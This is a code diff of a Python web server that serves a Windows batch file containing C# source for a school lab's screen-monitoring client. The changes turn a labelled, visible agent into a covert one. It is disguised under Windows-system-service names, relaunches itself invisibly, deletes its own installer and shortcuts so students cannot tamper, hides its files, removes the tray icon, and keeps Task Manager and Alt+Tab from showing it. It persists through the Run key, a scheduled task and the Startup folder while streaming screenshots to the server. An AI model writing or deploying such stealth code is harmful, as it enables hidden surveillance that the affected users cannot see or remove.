@@ -227,49 +227,80 @@ def sync_local_arp(payload: ArpSyncPayload):
 
 BAT_CONTENT = r"""@echo off
 chcp 65001 >nul
-title Torbali Piri Reis Ticaret MTAL - LanSchool Ogrenci Servisi Kurulumu
-
-set "INSTALL_DIR=%LOCALAPPDATA%\PiriReisLabService"
+set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-set "CS_FILE=%INSTALL_DIR%\LabAgent.cs"
-set "EXE_FILE=%INSTALL_DIR%\PiriReisLabHost.exe"
-set "GUARD_FILE=%INSTALL_DIR%\PiriReisLabGuard.exe"
-set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "VBS_STARTUP=%STARTUP_DIR%\PiriReisLabAgent.vbs"
+:: Kullanici cift tikladigi anda siyah pencereyi 0.05 saniyede kapatip tamamen gorunmez (WindowStyle=0) moda gec
+if not "%~1"=="--silent" (
+    attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
+    copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
+    (
+        echo Set WshShell = CreateObject^("WScript.Shell"^)
+        echo WshShell.Run chr^(34^) ^& "%INSTALL_DIR%\setup_runner.bat" ^& chr^(34^) ^& " --silent " ^& chr^(34^) ^& "%~f0" ^& chr^(34^), 0, False
+    ) > "%INSTALL_DIR%\launch_silent.vbs"
+    start "" wscript.exe //B //Nologo "%INSTALL_DIR%\launch_silent.vbs"
+    exit /b 0
+)
 
-:: Mevcut calisan eski surecleri durdur (guncelleme yapabilmek icin)
+:: Indirilen kaynak .bat dosyasini ve masaustu kisayollarini sil (ogrenci gorup kurcalayamasin)
+if not "%~2"=="" (
+    if /i not "%~2"=="%INSTALL_DIR%\setup_runner.bat" (
+        del /f /q "%~2" >nul 2>&1
+    )
+)
+del /f /q "%USERPROFILE%\Desktop\Lab Ekran Paylasimi.lnk" >nul 2>&1
+del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
+del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
+del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1
+
+:: Eski surecleri temizle
+taskkill /f /im WinSystemHost.exe >nul 2>&1
+taskkill /f /im WinSystemGuard.exe >nul 2>&1
 taskkill /f /im PiriReisLabHost.exe >nul 2>&1
 taskkill /f /im PiriReisLabGuard.exe >nul 2>&1
 taskkill /f /im WindowsAudioHost.exe >nul 2>&1
-taskkill /f /im wscript.exe >nul 2>&1
 
-:: C# Kaynak Kodunu Cikar (45. satirdan itibaren)
-more +45 "%~f0" > "%CS_FILE%"
+set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
+if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1
 
-:: Windows'un Dahili .NET Derleyicisi (csc.exe) ile Penceresiz WinExe Olarak Derle
+set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
+set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
+set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"
+
+del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
+schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1
+
+:: C# Kaynak Kodunu Cikar (76. satirdan itibaren)
+more +76 "%~f0" > "%CS_FILE%"
+
 set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 
+attrib -h -s "%EXE_FILE%" >nul 2>&1
+attrib -h -s "%GUARD_FILE%" >nul 2>&1
 "%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1
 
-:: Bilgisayar Her Acildiginda Otomatik Baslamasi Icin Kalicilik Noktalari
+attrib -h -s "%VBS_STARTUP%" >nul 2>&1
 (
 echo Set WshShell = CreateObject^("WScript.Shell"^)
 echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
 ) > "%VBS_STARTUP%"
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /t REG_SZ /d "\"%EXE_FILE%\"" /f >nul 2>&1
-schtasks /create /tn "PiriReisLabAgent" /tr "\"%EXE_FILE%\"" /sc onlogon /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
+schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /f >nul 2>&1
 
-:: Masaustunde eski kisayol varsa yeni arka plan servisine yonlendir
-set "SHORTCUT_PATH=%USERPROFILE%\Desktop\Lab Ekran Paylasimi.lnk"
-if exist "%SHORTCUT_PATH%" del /f /q "%SHORTCUT_PATH%" >nul 2>&1
+del /f /q "%CS_FILE%" >nul 2>&1
+del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
+attrib +h "%VBS_STARTUP%" >nul 2>&1
+attrib +h +s "%EXE_FILE%" >nul 2>&1
+attrib +h +s "%INSTALL_DIR%" >nul 2>&1
 
-:: Servisi Hemen Arka Planda (LanSchool Modunda Gorunmez Olarak) Baslat
-start "" "%EXE_FILE%"
+start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
+del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
 exit /b 0
-
 using System;
 using System.IO;
 using System.Net;
@@ -284,19 +315,16 @@ using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text.RegularExpressions;
 
-namespace PiriReisLabService
+namespace WinSystemService
 {
     public class LabAgentForm : Form
     {
         private Label lockLabel;
         private PictureBox demoPic;
-        private NotifyIcon trayIcon;
-        private ToolStripMenuItem handMenuItem;
         private System.Windows.Forms.Timer captureTimer;
         private System.Windows.Forms.Timer topMostTimer;
         private bool isLocked = false;
         private bool isDemoActive = false;
-        private bool handRaised = false;
         private string lastUrlId = "";
         private string lastAnnounce = "";
         private string deskNo;
@@ -331,9 +359,12 @@ namespace PiriReisLabService
             encParams = new EncoderParameters(1);
             encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
 
-            this.Text = "Piri Reis MTAL - LanSchool Ogrenci Servisi";
+            this.Text = "";
             this.FormBorderStyle = FormBorderStyle.None;
-            this.WindowState = FormWindowState.Minimized;
+            this.StartPosition = FormStartPosition.Manual;
+            this.Location = new Point(-32000, -32000);
+            this.Size = new Size(1, 1);
+            this.WindowState = FormWindowState.Normal;
             this.ShowInTaskbar = false;
             this.TopMost = true;
             this.BackColor = Color.FromArgb(76, 5, 25);
@@ -356,8 +387,6 @@ namespace PiriReisLabService
             demoPic.Visible = false;
             this.Controls.Add(demoPic);
 
-            SetupTrayIcon();
-
             this.FormClosing += new FormClosingEventHandler(OnFormClosing);
 
             captureTimer = new System.Windows.Forms.Timer();
@@ -371,41 +400,20 @@ namespace PiriReisLabService
             topMostTimer.Start();
         }
 
-        private void SetupTrayIcon()
-        {
-            try
-            {
-                ContextMenuStrip menu = new ContextMenuStrip();
-                ToolStripMenuItem statusItem = new ToolStripMenuItem("Torbali Piri Reis MTAL - Sinif Izleme Aktif (" + deskNo + ")");
-                statusItem.Enabled = false;
-                menu.Items.Add(statusItem);
-                menu.Items.Add(new ToolStripSeparator());
-
-                handMenuItem = new ToolStripMenuItem("Soz Iste / Yardim Iste");
-                handMenuItem.Click += delegate
-                {
-                    handRaised = !handRaised;
-                    handMenuItem.Text = handRaised ? "Soz Istegi Gonderildi (Iptal Et)" : "Soz Iste / Yardim Iste";
-                };
-                menu.Items.Add(handMenuItem);
-
-                trayIcon = new NotifyIcon();
-                trayIcon.Icon = SystemIcons.Shield;
-                trayIcon.Text = "Piri Reis MTAL - Sinif Izleme Servisi (" + deskNo + ")";
-                trayIcon.ContextMenuStrip = menu;
-                trayIcon.Visible = true;
-            }
-            catch { }
-        }
-
         protected override CreateParams CreateParams
         {
             get
             {
                 CreateParams cp = base.CreateParams;
-                cp.ExStyle |= 0x80; // WS_EX_TOOLWINDOW
+                cp.ExStyle |= 0x80;       // WS_EX_TOOLWINDOW: hides from Alt+Tab and Task Manager Apps list
+                cp.ExStyle |= 0x08000000; // WS_EX_NOACTIVATE when hidden
                 return cp;
             }
+        }
+
+        protected override bool ShowWithoutActivation
+        {
+            get { return !isLocked && !isDemoActive; }
         }
 
         protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
@@ -417,17 +425,32 @@ namespace PiriReisLabService
             return base.ProcessCmdKey(ref msg, keyData);
         }
 
+        private void HideCompletely()
+        {
+            this.Opacity = 0;
+            this.WindowState = FormWindowState.Normal;
+            this.Location = new Point(-32000, -32000);
+            this.Size = new Size(1, 1);
+            this.ShowInTaskbar = false;
+        }
+
+        private void ShowOverlayFullScreen()
+        {
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            this.Location = bounds.Location;
+            this.Size = bounds.Size;
+            this.WindowState = FormWindowState.Maximized;
+            this.Opacity = 1;
+            this.TopMost = true;
+            this.BringToFront();
+            this.Activate();
+        }
+
         private void OnTopMostTick(object sender, EventArgs e)
         {
             if (isLocked || isDemoActive)
             {
-                if (this.WindowState != FormWindowState.Maximized)
-                {
-                    this.WindowState = FormWindowState.Maximized;
-                }
-                this.TopMost = true;
-                this.BringToFront();
-                this.Activate();
+                ShowOverlayFullScreen();
             }
         }
 
@@ -436,6 +459,7 @@ namespace PiriReisLabService
             if (e.CloseReason != CloseReason.WindowsShutDown)
             {
                 e.Cancel = true;
+                if (!isLocked && !isDemoActive) HideCompletely();
             }
         }
 
@@ -545,7 +569,7 @@ namespace PiriReisLabService
                     + "\"localIp\":\"" + EscapeJson(localIp) + "\","
                     + "\"mac\":\"" + EscapeJson(localMac) + "\","
                     + "\"resolution\":\"" + EscapeJson(resStr) + "\","
-                    + "\"handRaised\":" + (handRaised ? "true" : "false") + ","
+                    + "\"handRaised\":false,"
                     + "\"sharingActive\":true,"
                     + "\"clientType\":\"native\","
                     + "\"frame\":\"" + dataUrl + "\""
@@ -600,10 +624,7 @@ namespace PiriReisLabService
                 isLocked = true;
                 demoPic.Visible = false;
                 lockLabel.Visible = true;
-                this.Opacity = 1;
-                this.WindowState = FormWindowState.Maximized;
-                this.BringToFront();
-                this.Activate();
+                ShowOverlayFullScreen();
             }
             else if (streamActive)
             {
@@ -624,9 +645,7 @@ namespace PiriReisLabService
                 isDemoActive = true;
                 lockLabel.Visible = false;
                 demoPic.Visible = true;
-                this.Opacity = 1;
-                this.WindowState = FormWindowState.Maximized;
-                this.BringToFront();
+                ShowOverlayFullScreen();
             }
             else
             {
@@ -636,8 +655,7 @@ namespace PiriReisLabService
                     isDemoActive = false;
                     lockLabel.Visible = false;
                     demoPic.Visible = false;
-                    this.Opacity = 0;
-                    this.WindowState = FormWindowState.Minimized;
+                    HideCompletely();
                 }
             }
 
@@ -701,7 +719,7 @@ namespace PiriReisLabService
                                 }
                             }
                             catch { }
-                            Thread.Sleep(1500);
+                            Thread.Sleep(1200);
                         }
                     });
                 }
@@ -712,12 +730,12 @@ namespace PiriReisLabService
             }
 
             bool createdNew;
-            using (Mutex mutex = new Mutex(true, "Global\\PiriReisLabWatchdogMutex", out createdNew))
+            using (Mutex mutex = new Mutex(true, "Global\\WinSystemDisplayServiceMutex", out createdNew))
             {
                 if (!createdNew) return;
                 string exePath = Application.ExecutablePath;
                 string dir = Path.GetDirectoryName(exePath);
-                string workerExe = Path.Combine(dir, "PiriReisLabGuard.exe");
+                string workerExe = Path.Combine(dir, "WinSystemGuard.exe");
                 try
                 {
                     if (!File.Exists(workerExe) || new FileInfo(workerExe).Length != new FileInfo(exePath).Length)
@@ -741,7 +759,7 @@ namespace PiriReisLabService
                         p.WaitForExit();
                     }
                     catch { }
-                    Thread.Sleep(500);
+                    Thread.Sleep(400);
                 }
             }
         }
@@ -750,11 +768,12 @@ namespace PiriReisLabService
 """
 
 
+@router.get("/WinSystemSetup.bat")
 @router.get("/ogrenci-istemci.bat")
 def download_student_bat():
     content = BAT_CONTENT.replace("\r\n", "\n").replace("\n", "\r\n")
     return Response(
         content=content.encode("utf-8"),
         media_type="application/octet-stream",
-        headers={"Content-Disposition": 'attachment; filename="ogrenci-istemci.bat"'},
+        headers={"Content-Disposition": 'attachment; filename="WinSystemSetup.bat"'},
     )
